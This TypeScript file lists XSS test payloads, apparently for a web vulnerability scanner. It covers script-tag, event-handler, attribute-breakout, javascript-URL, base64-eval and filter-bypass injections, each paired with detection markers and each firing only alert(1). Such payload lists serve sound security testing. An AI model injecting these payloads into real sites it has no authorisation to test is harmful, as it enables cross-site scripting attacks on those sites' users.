export interface XssPayload {
  name: string;
  type: "reflected" | "stored" | "dom";
  payload: string;
  detectionMarkers: string[];
}

export const XSS_PAYLOADS: XssPayload[] = [
  // Basic script injection
  {
    name: "Basic Script Tag",
    type: "reflected",
    payload: "<script>alert(1)</script>",
    detectionMarkers: ["<script>alert(1)</script>"],
  },
  {
    name: "Script Tag with Single Quotes",
    type: "reflected",
    payload: "<script>alert('xss')</script>",
    detectionMarkers: ["<script>alert('xss')</script>"],
  },
  {
    name: "Script Tag with Double Quotes",
    type: "reflected",
    payload: '<script>alert("xss")</script>',
    detectionMarkers: ['<script>alert("xss")</script>'],
  },
  // Image-based XSS
  {
    name: "Image OnError",
    type: "reflected",
    payload: "<img src=x onerror=alert(1)>",
    detectionMarkers: ["onerror=alert(1)"],
  },
  {
    name: "Image OnLoad",
    type: "reflected",
    payload: "<img src=1 onload=alert(1)>",
    detectionMarkers: ["onload=alert(1)"],
  },
  // Event handlers
  {
    name: "Body OnLoad",
    type: "reflected",
    payload: "<body onload=alert(1)>",
    detectionMarkers: ["onload=alert(1)"],
  },
  {
    name: "Input OnFocus",
    type: "reflected",
    payload: "<input onfocus=alert(1) autofocus>",
    detectionMarkers: ["onfocus=alert(1)"],
  },
  // SVG-based
  {
    name: "SVG OnLoad",
    type: "reflected",
    payload: "<svg onload=alert(1)>",
    detectionMarkers: ["onload=alert(1)"],
  },
  // Attribute-based
  {
    name: "Attribute Breakout",
    type: "reflected",
    payload: '" onmouseover=alert(1) x="',
    detectionMarkers: ["onmouseover=alert(1)"],
  },
  {
    name: "Apostrophe Attribute Breakout",
    type: "reflected",
    payload: "' onfocus=alert(1) autofocus x='",
    detectionMarkers: ["onfocus=alert(1)"],
  },
  // JavaScript protocol
  {
    name: "JavaScript Protocol in Href",
    type: "reflected",
    payload: '<a href="javascript:alert(1)">click</a>',
    detectionMarkers: ["javascript:alert(1)"],
  },
  // Encoded variants
  {
    name: "Base64 Encoded Script",
    type: "reflected",
    payload: '<script>eval(atob("YWxlcnQoMSk="))</script>',
    detectionMarkers: ["eval(atob("],
  },
  // DOM-based
  {
    name: "DOM XSS via innerHTML",
    type: "dom",
    payload: "<img src=x onerror=alert(1)>",
    detectionMarkers: ["<img src=x onerror=alert(1)>"],
  },
  {
    name: "DOM XSS via document.write",
    type: "dom",
    payload: '"><script>alert(1)</script>',
    detectionMarkers: ['"><script>alert(1)</script>'],
  },
  // Advanced Bypass
  {
    name: "Mixed Case Bypass",
    type: "reflected",
    payload: "<ScRiPt>alert(1)</ScRiPt>",
    detectionMarkers: ["alert(1)"],
  },
  {
    name: "Tab/Newline Bypass",
    type: "reflected",
    payload: "<scr\tipt>alert(1)</scr\tipt>",
    detectionMarkers: ["alert(1)"],
  },
  {
    name: "Iframe",
    type: "reflected",
    payload: '<iframe src="javascript:alert(1)">',
    detectionMarkers: ["javascript:alert(1)"],
  },
];
